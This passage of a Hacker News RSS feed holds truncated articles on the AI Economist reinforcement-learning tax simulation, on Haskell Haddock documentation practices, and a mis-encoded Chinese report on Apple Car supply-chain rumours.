on the opportunity to use AI to promote social welfare through the design of optimal tax policies in dynamic economies.</p><!--kg-card-begin: html--><ul>
    <li><strong><a href="https://doi.org/10.1038/nature24270" target="_blank">Mastering The Game Of Go Without Human
                Knowledge.</a></strong> Silver, David, Julian Schrittwieser, Karen Simonyan, Ioannis Antonoglou, Aja
        Huang, Arthur Guez, Thomas Hubert et al. Nature 550, no. 7676 (2017): 354-359.</li>
    <li><strong><a href="https://doi.org/10.1038/s41586-019-1724-z" target="_blank">Grandmaster Level In Starcraft Ii
                Using Multi-Agent Reinforcement Learning.</a></strong> Vinyals, Oriol, Igor Babuschkin, Wojciech M.
        Czarnecki, MichaÃƒÂ«l Mathieu, Andrew Dudzik, Junyoung Chung, David H. Choi et al. Nature 575, no. 7782 (2019):
        350-354.</li>
    <li><strong><a href="https://arxiv.org/abs/1912.06680" target="_blank">Dota 2 With Large Scale Deep Reinforcement
                Learning.</a></strong> Berner, Christopher, Greg Brockman, Brooke Chan, Vicki Cheung, PrzemysÃ…â€šaw DÃ„â„¢biak,
        Christy Dennison, David Farhi et al. arXiv preprint arXiv:1912.06680 (2019).</li>
    <li><strong><a href="https://arxiv.org/abs/1706.03459" target="_blank">Optimal Auctions Through Deep
                Learning.</a></strong> DÃƒÂ¼tting, Paul, Zhe Feng, Harikrishna Narasimhan, David C. Parkes, and Sai
        Srivatsa Ravindranath. In International Conference on Machine Learning, pp. 1706-1715 (2019).</li>
</ul><!--kg-card-end: html--><h2 id="the-challenge-of-optimal-tax-design">The Challenge of Optimal Tax Design</h2><p>Many studies have shown that high income inequality can negatively impact economic growth and economic opportunity. Taxes can help reduce inequality, but it is hard to find the optimal tax policy. Economic theory cannot fully model the complexities of the real world. Instead, tax theory relies on simplifying assumptions that are hard to validate, for example, about the effect of taxes on how much people work. Moreover, real-world experimentation with taxes is almost impossible.</p><!--kg-card-begin: html--><ul>
    <li><a href="https://www.un.org/esa/socdev/documents/reports/InequalityMatters.pdf" target="_blank"><strong>Inequality Matters.</strong></a> United Nations.</li>
    <li><a href="https://publications.jrc.ec.europa.eu/repository/bitstream/JRC76149/lbna25574enn.pdf" target="_blank"><strong>Literature Review On Income Inequality And The Effects On Social
                Outcomes.</strong></a> Beatrice dÃ¢â‚¬â„¢Hombres, Anke Weber, and Leandro Elia. JRC Scientific and Policy
        Reports, 2012</li>
    <li><a href="https://doi.org/10.1093/epirev/mxh003" target="_blank"><strong>Income Inequality and Health: What Have
                We Learned So Far?</strong></a> S. V. Subramanian, Ichiro Kawachi. Epidemiologic Reviews, Volume 26,
        Issue 1, July 2004, Pages 78Ã¢â‚¬â€œ91</li>
    <li><a href="https://news.un.org/en/story/2020/01/1055681" target="_blank"><strong>Rising Inequality Affecting More
                Than Two-Thirds Of The Globe, But ItÃ¢â‚¬â„¢s Not Inevitable: New UN Report.</strong></a> UN News.</li>
    <li><a href="https://inequality.org/facts/global-inequality" target="_blank"><strong>Global Inequality.</strong></a>
        Inequality.org.</li>
    <li><a href="https://wir2018.wid.world/files/download/wir2018-summary-english.pdf" target="_blank"><strong>World
                Inequality Report.</strong></a> 2018</li>
</ul><!--kg-card-end: html--><h3 id="the-economic-model-of-income-labor-skill-and-utility">The Economic Model of Income, Labor, Skill, and Utility</h3><p>Classic tax theory focuses on people who earn <strong>income</strong> by performing <strong>labor</strong>. A worker gains utility from income but incurs the cost of labor effort. At some point, the extra utility from additional income does not outweigh the cost of additional effort. </p><p><em>For instance, working on weekends might earn you more money, but the effort might not be worth it to you.</em></p><p>A key assumption is that people differ in their <strong>skill</strong> level. Low-skilled workers receive a lower hourly wage, and so earn less money than high-skilled workers for the same amount of labor. This leads to inequality.</p><h3 id="the-central-tax-dilemma">The Central Tax Dilemma</h3><p>As a policy goal, a government may prefer to tax and redistribute income in order to improve equality. However, higher taxation can discourage work and may particularly affect high-skilled workers. An optimal tax policy optimizes this balance between equality and productivity. </p><!--kg-card-begin: html--><figure><img src="https://blog.einstein.ai/content/images/2020/04/figure-5-4.png"><figcaption>An illustrative view of how taxes can impact social outcomes. Left: Taxes can improve equality by transferring income. However, taxes can also decrease productivity, because they can discourage work. The AI Economist seeks a tax policy that optimizes this trade-off. The Pareto boundary is the set of maximal trade-offs. Right: Taxes impact productivity (total income, represented by the area of the big squares), and equality (the relative difference in sizes of the smaller squares). In this illustration, the AI Economist achieves the best trade-off.</figcaption></figure><!--kg-card-end: html--><p>A prominent tax framework, proposed by Emmanuel Saez, derives a simple optimal tax formula. However, this formula requires knowing how labor responds to changes in tax rates (Ã¢â‚¬Å“elasticityÃ¢â‚¬ï¿½) and makes strong assumptions, for example, that the economy is static and workers do not gain new skills. Other work has studied dynamic economic systems, but needs simplifying assumptions in order to attain analytical solutions. For an extended overview of related work, see our technical paper.</p><!--kg-card-begin: html--><ul>
    <li><strong><a href="https://eml.berkeley.edu/~saez/derive.pdf" target="_blank">Using Elasticities To Derive Optimal
                Income Tax Rates.</a></strong> Saez, Emmanuel<br>
        The Review Of Economic Studies 68.1 (2001): 205-229.</li>
    <li><strong>The New Dynamic Public Finance.</strong> Kocherlakota, Narayana R.<br>
        Princeton; Oxford: Princeton University Press, 2010.</li>
</ul><!--kg-card-end: html--><h2 id="economic-simulation-as-a-learning-environment">Economic Simulation as a Learning Environment</h2><p>The AI Economist is a <strong>purely simulation and data-driven approach</strong> to the design of optimal tax policies. It uses a principled economic simulation with both workers and a policy maker (a "planner" in the economics literature), all of whom are collectively learning<strong> </strong>using reinforcement learning. </p><figure><img src="https://blog.einstein.ai/content/images/2020/04/freemarket-ai-1.gif"><figcaption>Left: Economic simulation in which four agents collect and trade resources, build houses and earn income. Right: wealth is not distributed evenly. The size of the disk shows total productivity, while colors show the percentage each agent owns. The trade-off between equality and productivity is measured by multiplying equality and productivity.&nbsp;</figcaption></figure><h3 id="gathering-trading-and-building">Gathering, Trading and Building</h3><p>The simulation uses a two-dimensional world. There are two types of resources: wood and stone. Resources are scarce: they appear in the world at a limited rate. Workers move around, gather and trade resources, and earn income by building houses (this costs stone and wood). Houses block access: workers cannot move through the houses built by others. The simulation runs this economy over the course of an episode, which is analogous to a Ã¢â‚¬Å“working career.Ã¢â‚¬ï¿½ </p><h3 id="skill-and-utility">Skill and Utility</h3><p>A key feature is that workers have different skills<strong>. </strong>Higher-skilled workers earn more income for building houses, and thus more utility. Building houses also takes effort, which lowers utility. Workers also pay income taxes and the collected tax is redistributed evenly among the workers. Together, these economic factors and the various competitive drivers mean that workers need to be strategic in order to maximize their utility. </p><h3 id="emergent-specialization">Emergent Specialization</h3><p>Our economic simulation produces rich behavior when AI agents (the agents are the workers in the economy) learn to maximize their utility. A salient feature is specialization: AI agents with lower skill become <strong>gatherer-and-sellers </strong>and earn income by collecting and selling stone and wood. Agents with higher skill specialize as <strong>buyer-and-builders</strong> and purchase stone and wood in order to more quickly build houses. </p><!--kg-card-begin: html--><figure><img src="https://blog.einstein.ai/content/images/2020/04/group-embed.svg"><figcaption>Top: The state of the simulation over the course of a single play-through. Middle: Highly skilled agents choose to do more work, and earn larger incomes and experience more utility. Bottom: Agents trade with each other throughout. Upward bars indicate the agent mostly sold resources (earning coin) and downward bars indicate that it mostly bought resources (spending coin).</figcaption></figure><!--kg-card-end: html--><p>We do not impose such roles or behaviors directly. Rather, specialization emerges because differently skilled workers learn to balance their income and effort. This demonstrates the richness of the economic simulation and builds trust that agents respond to economic drivers. Complex emergent economic behavior has been previously studied in economics through agent-based modeling, but this has largely proceeded without the benefit of recent advances in AI.</p><!--kg-card-begin: html--><ul>
    <li><strong><a href="https://www.pnas.org/content/99/suppl_3/7280" target="_blank">Agent-Based Modeling: Methods And
                Techniques For Simulating Human Systems.</a></strong> Bonabeau, â€¦</li></ul></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.einstein.ai/the-ai-economist/">https://blog.einstein.ai/the-ai-economist/</a></em></p>]]>
            </description>
            <link>https://blog.einstein.ai/the-ai-economist/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25496410</guid>
            <pubDate>Mon, 21 Dec 2020 16:30:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell Documentation with Haddock: Wishes'n'Tips]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25496349">thread link</a>) | @kowainik
<br/>
December 21, 2020 | https://kowainik.github.io/posts/haddock-tips | <a href="https://web.archive.org/web/*/https://kowainik.github.io/posts/haddock-tips">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
              <div>
              <p>Haskell has a stigma of having poor or no documentation at all. Though more and more maintainers are doing a hell of a job to improve the quality of their libraries and applications, it is still not enough. We need to strengthen our vision of documentation collectively and as a consequence, master the existing tools for doing that.</p>
<p>There are <a href="https://documentation.divio.com/">different types of documentation</a>. Today we want to talk about API and libraries documentation inside your library, and accordingly about Haskell gear for that â€“ <a href="https://www.haskell.org/haddock/">Haddock</a>.</p>
<p>The blog post is going to give Haddock overview, suggest documentation best practices, reveal the specialities of the Haddock tool, and show-and-tell lots of different examples of how to squeeze more out of your documentation. It should be interesting to library maintainers, developers who want to improve their documenting skills and everyone interested in documentation techniques in Haskell.</p>
<h2 id="what-is-haddock">What is Haddock<a href="#what-is-haddock">ğŸ”—</a></h2>
<p>Haddock is the Haskell way to document exposed API of your library or application. Writing special comments alongside your code helps to keep code and documentation synchronised and up-to-date (as outdated documentation is a painful problem to deal with). It also makes the docs comfy both for maintainers and users. And Haddock provides precisely that. Haskell is not always beginner-friendly, so giving a helping hand to users of your code in a convenient way is greatly appreciated.</p>
<p>You write documentation using the special Haddock markup language right near the structures you want to document, and it can be rendered to different formats, including styled HTML, that could be viewable later on <a href="http://hackage.haskell.org/">Hackage</a>, <a href="https://www.stackage.org/">Stackage</a> or even locally. Moreover, if you upload your library to Hackage or Stackage, <a href="https://hoogle.haskell.org/">Hoogle</a> will search for definitions by name or type across all packages, including yours.</p>
<p>Here is how a typical Haddock documentation page for a module looks like:</p>
<figure>
<img src="https://kowainik.github.io/images/haddock/haddock-membrain.png" alt=""><figcaption>Haddock Module Example</figcaption>
</figure>
<p>To produce the documentation, Haddock needs to build the project first because it uses build-time information. But you donâ€™t need to worry about it usually, because build tools do that automatically when you ask them to output documentation.</p>

<p>Haddock is written in Haskell comments with the special annotations. There are two types of Haddock marked comments â€“ <strong>pre-</strong> (starting with the <code>|</code> symbol) and <strong>post-comments</strong> (starting with the <code>^</code> symbol), which means that Haddock comments could be put right before or after the function/type/class definitions.</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>-- | I am the 'foo' function's Haddock pre-comment.</span></span>
<span id="cb1-2"><span>foo ::</span> <span>Int</span> <span>-&gt;</span> <span>Int</span></span>
<span id="cb1-3"></span>
<span id="cb1-4"><span>bar ::</span> <span>Int</span> <span>-&gt;</span> <span>Int</span></span>
<span id="cb1-5"><span>-- ^ I am the 'bar' function's Haddock post-comment</span></span></code></pre></div>
<p>For multi-line Haddock comments you can use either <strong>per-line</strong> or <strong>block</strong> style comments for both pre and post types. The special Haddock symbol needs to be added just to the first line of the multi-line comment, and Haddock will consume following lines until the first non-comment line.</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>-- | This is multiline</span></span>
<span id="cb2-2"><span>-- per-line Haddock pre-comment</span></span>
<span id="cb2-3"><span>foo ::</span> <span>Int</span> <span>-&gt;</span> <span>Int</span></span>
<span id="cb2-4"></span>
<span id="cb2-5"></span>
<span id="cb2-6"><span>bar ::</span> <span>Int</span> <span>-&gt;</span> <span>Bool</span></span>
<span id="cb2-7"><span>-- ^ Another per-line Haddock</span></span>
<span id="cb2-8"><span>-- post-comment</span></span>
<span id="cb2-9"></span>
<span id="cb2-10"><span>{- | Multiline Haddock</span></span>
<span id="cb2-11"><span>block pre-comment</span></span>
<span id="cb2-12"><span>-}</span></span>
<span id="cb2-13"><span>baz ::</span> <span>Double</span> <span>-&gt;</span> <span>Text</span></span></code></pre></div>
<p>If you write multi-line comments in your code, we strongly advise using <strong>block</strong> comments by default over per-line ones because of the number of reasons:</p>
<ul>
<li><p>There are fewer chances to lose part of your documentation due to the extra newline with multiline comments syntax, unlike per-line comments. Remember, that Haddock consumes comments marked as documentation until the first non-comment line, and a newline without <code>--</code> separates such comments into ordinary independent groups.</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>-- | I am a normal line of documentation.</span></span>
<span id="cb3-2"><span>-- I will be in the docs too.</span></span>
<span id="cb3-3"></span>
<span id="cb3-4"><span>-- I am not going to make it due to the missing @--@ in the previous line.</span></span>
<span id="cb3-5"><span>foo ::</span> <span>Int</span></span></code></pre></div></li>
<li><p>As a consequence, itâ€™s impossible to have conditional documentation chunks under the <a href="https://guide.aelve.com/haskell/cpp-vww0qd72">C Preprocessor (CPP)</a> pragmas when using the <code>--</code> style of comments, as CPP pragmas are stripped to empty lines.</p></li>
<li><p>Multiline comments contain less noise (no <code>--</code> on each line), making it easier to read and update.</p></li>
<li><p>They are more suitable for inserting/copying/updating code snippets quickly.</p></li>
<li><p>They also occupy less space horizontally on average, because you donâ€™t waste 3 characters on each line.</p></li>
</ul>
<h3 id="what-can-be-documented">What can be documented<a href="#what-can-be-documented">ğŸ”—</a></h3>
<p>Generally, Haddock documents the exposed API of your Haskell libraries and applications.</p>
<p>More specifically, Haddock can be applied to document the following parts of the Haskell code:</p>
<ul>
<li>Top-level module headers</li>
<li>Type definitions: <code>data</code>, <code>type</code> and <code>newtype</code></li>
<li>Constructors and fields</li>
<li>Typeclasses â€” <code>class</code> declarations</li>
<li>Typeclasses methods</li>
<li>Instances</li>
<li>Derived typeclasses</li>
<li>Top-level functions</li>
<li>Arguments and return results of functions</li>
<li>More exotic top-level definitions: <code>pattern</code>, <code>type family</code>, <code>data family</code>, <code>type instance</code> and <code>data instance</code></li>
</ul>
<p>The below example showcases some Haddock syntax and features:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>{- | Our example sum type.</span></span>
<span id="cb4-2"></span>
<span id="cb4-3"><span>__Examples:__</span></span>
<span id="cb4-4"></span>
<span id="cb4-5"><span>@</span></span>
<span id="cb4-6">empty <span>=</span> <span>'Empty'</span></span>
<span id="cb4-7">full <span>=</span> <span>'CharCode'</span> <span>42</span> \'a\'</span>
<span id="cb4-8"><span>@</span></span>
<span id="cb4-9"><span>-</span>}</span>
<span id="cb4-10"><span>data</span> <span>CharWithInt</span></span>
<span id="cb4-11">    <span>=</span> <span>Empty</span> <span>-- ^ First constructor</span></span>
<span id="cb4-12"></span>
<span id="cb4-13">      <span>-- | Second constructor</span></span>
<span id="cb4-14">    <span>|</span> <span>CharCode</span></span>
<span id="cb4-15">        <span>Int</span> <span>-- ^ first field of 'CharCode'</span></span>
<span id="cb4-16">        <span>Char</span> <span>-- ^ second field of 'CharCode'</span></span>
<span id="cb4-17">    <span>deriving</span> stock</span>
<span id="cb4-18">        ( <span>Show</span>  <span>{- ^ Derived to show.</span></span>
<span id="cb4-19"></span>
<span id="cb4-20"><span>                 @since 0.1.0.0</span></span>
<span id="cb4-21"><span>                -}</span></span>
<span id="cb4-22">        , <span>Eq</span>  <span>-- ^ Derived to check for equality</span></span>
<span id="cb4-23">        )</span>
<span id="cb4-24"></span>
<span id="cb4-25"><span>{- | Type class to eject some fields from the data types.</span></span>
<span id="cb4-26"></span>
<span id="cb4-27"><span>@since 0.0.0.0</span></span>
<span id="cb4-28"><span>-}</span></span>
<span id="cb4-29"><span>class</span> <span>Eject</span> a <span>where</span></span>
<span id="cb4-30">   <span>{-# MINIMAL getInt #-}</span></span>
<span id="cb4-31">   <span>-- | Get 'Int' if applicable.</span></span>
<span id="cb4-32">   getInt</span>
<span id="cb4-33"><span>       ::</span> a  <span>-- ^ The whole data type.</span></span>
<span id="cb4-34">       <span>-&gt;</span> <span>Maybe</span> <span>Int</span>  <span>-- ^ Result. 'Nothing' if no 'Int' in data type.</span></span>
<span id="cb4-35"></span>
<span id="cb4-36">   <span>-- | Get 'Char' if applicable.</span></span>
<span id="cb4-37"><span>   getChar ::</span> a <span>-&gt;</span> <span>Maybe</span> <span>Char</span></span>
<span id="cb4-38"></span>
<span id="cb4-39"><span>-- | The instance for our sum type written manually</span></span>
<span id="cb4-40"><span>instance</span> <span>Eject</span> <span>CharWithInt</span> <span>where</span></span>
<span id="cb4-41"><span>    getInt ::</span> <span>CharWithInt</span> <span>-&gt;</span> <span>Maybe</span> <span>Int</span></span>
<span id="cb4-42">    getInt <span>Empty</span>          <span>=</span> <span>Nothing</span></span>
<span id="cb4-43">    getInt (<span>CharCode</span> i _) <span>=</span> <span>Just</span> i</span>
<span id="cb4-44"></span>
<span id="cb4-45"><span>    getChar ::</span> <span>CharWithInt</span> <span>-&gt;</span> <span>Maybe</span> <span>Char</span></span>
<span id="cb4-46">    <span>getChar</span> <span>Empty</span>          <span>=</span> <span>Nothing</span></span>
<span id="cb4-47">    <span>getChar</span> (<span>CharCode</span> _ c) <span>=</span> <span>Just</span> c</span></code></pre></div>
<p>When documentation is built, it will look like on the screenshot below:</p>
<figure>
<img src="https://kowainik.github.io/images/haddock/haddock-overall-example.png" alt=""><figcaption>Haddock Overall Example</figcaption>
</figure>
<hr>
<p>We donâ€™t recommend using the Haddock comment syntax for other places where they cannot be applied by specification because this breaks Haddock. Even though the documentation states that such comments should be ignored, it is not what you would get on the output.</p>
<p>For example, the following innocent-looking Haddock results in the documentation error:</p>
<div id="cb5"><pre><code><span id="cb5-1"><span>var ::</span> <span>Int</span></span>
<span id="cb5-2">var <span>=</span> <span>42</span> <span>-- ^ The answer</span></span></code></pre></div>
<pre><code>Haddock coverage:

src/BlogpostHaddock.hs:57:10: error:
    parse error on input '-- ^ The answer'
   |
57 | var = 42 -- ^ The answer
   |          ^^^^^^^^^^^^^^^
</code></pre>
<p>This issue will prevent the documentation appearing at Hackage and Stackage, which means that users wonâ€™t be able to read package documentation easily or search by the package in Hoogle.</p>
<p>Correct documentation looks like this:</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>var ::</span> <span>Int</span> <span>-- ^ The answer</span></span>
<span id="cb7-2">var <span>=</span> <span>42</span></span></code></pre></div>
<p>If you wanted to leave an ordinary (non-documentation) comment:</p>
<div id="cb8"><pre><code><span id="cb8-1"><span>var ::</span> <span>Int</span></span>
<span id="cb8-2">var <span>=</span> <span>42</span> <span>-- The answer</span></span></code></pre></div>
<hr>
<p>We are not going to cover all annotation syntax. You can learn more from the <a href="https://haskell-haddock.readthedocs.io/en/latest/index.html">official documentation</a>. Instead, we will try to focus on best practices, advice and more explanation of suitability and usability of some various pieces of documentation on different levels.</p>
<h2 id="haddock-fishing">Haddock Fishing<a href="#haddock-fishing">ğŸ”—</a></h2>
<p>As most of us are looking at the librariesâ€™ documentation through Hackage/Stackage/Haddock or local options of the same format, we are going to cover each layer of the documentation on the page piece by piece from top to bottom and see how we can use 100% of each element.</p>
<p>Every page is responsible for one Haskell module and correspondingly reflects its structure, though in a user-configurable way (we will cover later the ways to take control over that). So, with respect to that, letâ€™s start diving into the meaning of each and every documentation piece.</p>
<div>
<p>Though, sometimes you are interested only in specific types and functions, not in reading the full documentation. Hackage helps here as well. You can press the <kbd>s</kbd> button on a package page to quickly jump to definitions.</p>
<figure>
<img src="https://kowainik.github.io/images/haddock/haddock-relude-search.png" alt=""><figcaption>Haddock Search Example</figcaption>
</figure>
</div>
<h3 id="top-level">Top Level<a href="#top-level">ğŸ”—</a></h3>
<p>First thing you see on the module documentation page is this:</p>
<figure>
<img src="https://kowainik.github.io/images/haddock/haddock-top-level-header.png" alt=""><figcaption>Haddock top-level header</figcaption>
</figure>
<p>This whole information is taken from the top-level Haddock comment for the module. The comment is attached to the <code>module</code> construction in the source file. You can put extensions (<code>{-# LANGUAGE ... #-}</code>) and options (e.g.&nbsp;<code>{-# OPTIONS_GHC ... #-}</code>) either <em>before</em> the module header comment or <em>after</em>, but we recommend putting module Haddock comment closer to the module keyword itself, <strong>after</strong> all language extensions and module-specific options.</p>
<p>So the module layout may look like this:</p>
<div id="cb9"><pre><code><span id="cb9-1"><span>{-# LANGUAGE ScopedTypeVariables #-}</span></span>
<span id="cb9-2"><span>{-# LANGUAGE TypeApplications    #-}</span></span>
<span id="cb9-3"></span>
<span id="cb9-4"><span>{- | ... Module header comment</span></span>
<span id="cb9-5"><span>-}</span></span>
<span id="cb9-6"></span>
<span id="cb9-7"><span>module</span> <span>MyModule</span> (<span>...</span>) <span>where</span></span></code></pre></div>

<p>The meta-information in the border to the right is the result of special annotations at the beginning of the top-level Haddock. If it isnâ€™t present in the file, then none will be shown in there (except for automatically determined info by the tool you are using).</p>
<p>These annotations include the following information:</p>
<ul>
<li><code>Module</code> â€“ Module name</li>
<li><code>Description</code> â€“ Short description</li>
<li><code>Copyright</code> â€“ Copyright note (preserves newlines)</li>
<li><code>License</code> or <code>Licence</code> or <code>SPDX-License-Identifier</code> â€“ the name of the license used in the project</li>
<li><code>Maintainer</code> â€“ information about current maintainer, can include email</li>
<li><code>Stability</code> â€“ <em>experimental</em> or <em>stable</em></li>
<li><code>Portability</code> â€“ <em>portable</em> or <em>non-portable</em>, but you can put anything basically. This field meaning is not strictly defined. Some people use it for OS-portability and write something like POSIX, Windows, portable. Other people mean â€œthe Haskell compiler according to standard portabilityâ€ and put â€œnon-portableâ€ here if a module uses GHC-only extensions.</li>
</ul>
<p>Auto-filled, no manual fill-in is possible:</p>
<ul>
<li><code>Safe Haskell</code> â€“ <code>Safe</code>, <code>Trustworthy</code>, <code>Unsafe</code> or <code>None</code> (default)</li>
<li><code>Language</code> â€“ Haskell report: 98 or 2010</li>
</ul>
<p>All of the fields are optional, in free format and donâ€™t have any requirements. Adding this header to each module is advisable.</p>
<blockquote>
<p>ğŸ‘©â€ğŸ« You â€¦</p></blockquote></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kowainik.github.io/posts/haddock-tips">https://kowainik.github.io/posts/haddock-tips</a></em></p>]]>
            </description>
            <link>https://kowainik.github.io/posts/haddock-tips</link>
            <guid isPermaLink="false">hacker-news-small-sites-25496349</guid>
            <pubDate>Mon, 21 Dec 2020 16:26:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple Car said to be released in third quarter of 2021]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25495953">thread link</a>) | @bookofjoe
<br/>
December 21, 2020 | https://j3onakwrnmmdhlpoecrnirxutq-adwhj77lcyoafdy-money-udn-com.translate.goog/money/story/5612/5108191 | <a href="https://web.archive.org/web/*/https://j3onakwrnmmdhlpoecrnirxutq-adwhj77lcyoafdy-money-udn-com.translate.goog/money/story/5612/5108191">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article_body"> 
         
         <figure>
          <a href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;nv=1&amp;u=https://pgw.udn.com.tw/gw/photo.php?u%3Dhttps://uc.udn.com.tw/photo/2020/12/20/realtime/9668576.jpg%26x%3D0%26y%3D0%26sw%3D0%26sh%3D0%26sl%3DW%26fw%3D1050%26exp%3D3600%26exp%3D3600" rel="prettyPhoto[pp_gal]"><img src="https://pgw.udn.com.tw/gw/photo.php?u=https://uc.udn.com.tw/photo/2020/12/20/realtime/9668576.jpg&amp;x=0&amp;y=0&amp;sw=0&amp;sh=0&amp;sl=W&amp;fw=1050&amp;exp=3600&amp;exp=3600" alt="ä¾›æ‡‰éˆå‚³å‡ºï¼Œè˜‹æœApple Caræ˜å¹´ç¬¬3å­£ç™¼è¡¨ï¼Œè¿‘æœŸç©æ¥µå‘å°å» æ‹‰è²¨ã€‚ï¼ˆæ­æ–°ç¤¾ï¼‰" title="ä¾›æ‡‰éˆå‚³å‡ºï¼Œè˜‹æœApple Caræ˜å¹´ç¬¬3å­£ç™¼è¡¨ï¼Œè¿‘æœŸç©æ¥µå‘å°å» æ‹‰è²¨ã€‚ï¼ˆæ­æ–°ç¤¾ï¼‰"></a>
          <figcaption>
           ä¾›æ‡‰éˆå‚³å‡ºï¼Œè˜‹æœApple Caræ˜å¹´ç¬¬3å­£ç™¼è¡¨ï¼Œè¿‘æœŸç©æ¥µå‘å°å» æ‹‰è²¨ã€‚ï¼ˆæ­æ–°ç¤¾ï¼‰
          </figcaption>
          
         </figure>
         <!-- /.photo -->
         
         
         <p> ç‰¹æ–¯æ‹‰æœ€å¤§å‹æ•µä¾†äº†ï¼Œè˜‹æœé¦–æ¬¾é›»å‹•è»Šã€ŒApple Carã€å°‡æå‰å•ä¸–ã€‚ä¾›æ‡‰éˆé€éœ²ï¼Œè˜‹æœæ¯”ç…§iPhoneå‚™æ–™ç”±é›¶çµ„ä»¶é–‹å§‹å‚¬è²¨çš„æ…£ä¾‹ï¼Œè¿‘æœŸå‘å’Œå¤§ï¼ˆ1536ï¼‰ã€è²¿è¯-KYã€å’Œå‹¤ã€å¯Œç”°ç­‰å°ç£æ±½è»Šé›¶çµ„ä»¶å» æå‡ºå‚™è²¨è¦æ±‚ï¼Œå°‡ç›¸é—œæ¥­è€…å…¥åˆ—é¦–æ³¢ä¾›æ‡‰éˆã€‚</p>
         <!--1-->
         
         <p> å°ç£é—œéµä¾›æ‡‰éˆè­‰å¯¦ï¼Œè˜‹æœé è¨ˆæ˜å¹´9æœˆç™¼è¡¨Apple Carï¼Œæ¯”åŸå…ˆè¦åŠƒææ—©è‡³å°‘å…©å¹´ï¼Œå…¶åŸå‹è»Šå·²ç¶“åœ¨ç¾åœ‹åŠ å·ä¸Šè·¯æ¸¬è©¦ï¼Œå› æ‡‰Apple Caræ‹‰è²¨éœ€æ±‚ï¼Œå’Œå¤§ã€è²¿è¯ç­‰å°å» å¿™ç¿»å¤©ï¼Œå…¨é¢çˆ†å–®ã€‚ </p>
         
         <!--2-->
         
         <figure>
          <a href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;nv=1&amp;u=https://pgw.udn.com.tw/gw/photo.php?u%3Dhttps://uc.udn.com.tw/photo/2020/12/21/2/9675610.jpg%26x%3D0%26y%3D0%26sw%3D0%26sh%3D0%26sl%3DW%26fw%3D1050%26exp%3D3600%26exp%3D3600" rel="prettyPhoto[pp_gal]"><img src="https://pgw.udn.com.tw/gw/photo.php?u=https://uc.udn.com.tw/photo/2020/12/21/2/9675610.jpg&amp;x=0&amp;y=0&amp;sw=0&amp;sh=0&amp;sl=W&amp;fw=1050&amp;exp=3600&amp;exp=3600" alt="" title=""></a>
          <figcaption></figcaption>
          
         </figure>
         <!-- /.photo -->
         
         <p> å„˜ç®¡é­é»åçš„å°å» éƒ½ç›¸ç•¶ä½èª¿ï¼Œä½†è¿‘æœŸå·²æœ‰ä¸å°‘åœ‹å…§æ±½è»Šé›¶çµ„ä»¶å» é–‹å§‹ã€Œå‹•èµ·ä¾†ã€ï¼Œé€éœ²Apple Carå¤§å–®å°‡è‡³çš„è¨Šæ¯ã€‚å…¶ä¸­ï¼Œå’Œå¤§ä½æ–¼å˜‰ç¾©å¤§åŸ”ç¾åœ’å€çš„æ–°å» ï¼Œæ­£åŠ é€ŸAIæ™ºèƒ½åŒ–ç”¢ç·šå¸ƒå»ºï¼Œæ˜å¹´ç¬¬2å­£å°‡å¯æ–°å¢å…­æ¢ç”¢ç·šæŠ•ç”¢ã€‚</p>
         <!--3-->
         
         <p> å’Œå‹¤ä¹Ÿç©æ¥µé€²è¡Œå…©å²¸æ“´ç”¢ï¼Œå°ç£å…¨èˆˆå» é è¨ˆå¹´åº•å®Œæˆæ¬é·åŠé‡ç”¢ï¼Œå˜‰èˆˆå’Œæ–°å» ç¬¬äº”è»Šé–“æ“´å» è¨‚æ˜å¹´ç¬¬2å­£å®Œæˆæ¬é·ã€‚</p>
         <!--4-->
         
         <p> å¯Œç”°ä½æ–¼éŠ…é‘¼çš„äºŒæœŸå» é è¨ˆæ˜å¹´æŠ•ç”¢ï¼Œä¸€ã€äºŒæœŸå» é›»å‹•è»Šå‹•åŠ›é¦¬é”é›¶çµ„ä»¶ç”¢èƒ½ï¼Œå¯ç”±ç›®å‰çš„æ¯å¹´40è¬å¥—ï¼Œä¸€èˆ‰æ‹‰å‡è‡³100è¬å¥—ï¼Œå‹•åŠ›é›†æˆç³»çµ±å‰‡å¢è‡³40è¬å¥—ä»¥ä¸Šã€‚</p>
         <!--5-->
         
         <p> æ¥­ç•ŒæŒ‡å‡ºï¼Œé™¤äº†é›»å‹•è»Šé¾é ­ç‰¹æ–¯æ‹‰ä¹‹å¤–ï¼Œåœ‹å…§é›»å‹•è»Šä¾›æ‡‰éˆæœ€è¿‘å‡ºç¾ä¸€å€‹æ–°çš„ç™¼ç‡’åè©ã€Œç¾åœ‹é›™Aã€ï¼Œç©æ¥µå‘å°å» ä¸‹å–®ã€‚</p>
         <!--6-->
         
         <p> å„˜ç®¡ä¾›æ‡‰éˆå» å•†éƒ½ç°½ç½²ä¿å¯†å”å®šï¼Œä¸é¡˜é€éœ²ç´°ç¯€ï¼Œä½†çŸ¥æƒ…çš„æ¥­è€…å¦è¨€ï¼Œã€Œç¾åœ‹é›™Aã€æŒ‡çš„å°±æ˜¯è˜‹æœï¼ˆAppleï¼‰èˆ‡äºé¦¬éœï¼ˆAmazonï¼‰å…©å®¶å» å•†ï¼Œæ¥­è€…æš±ç¨±ç‚ºã€Œä¸€å€‹å¤§Aï¼Œä¸€å€‹å°Aã€ã€‚</p>
         <!--7-->
         
